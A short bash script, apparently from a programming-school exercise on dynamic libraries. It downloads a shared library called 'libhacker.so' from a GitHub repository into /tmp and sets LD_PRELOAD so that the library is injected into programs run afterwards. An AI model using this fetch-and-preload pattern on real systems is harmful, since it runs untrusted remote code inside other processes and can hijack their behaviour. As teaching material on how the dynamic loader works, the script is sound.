#!/bin/bash
wget -p /tmp https://github.com/RudzaniMatidze/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhacker.so
export LD_PRELOAD=/tmp/libhacker.so
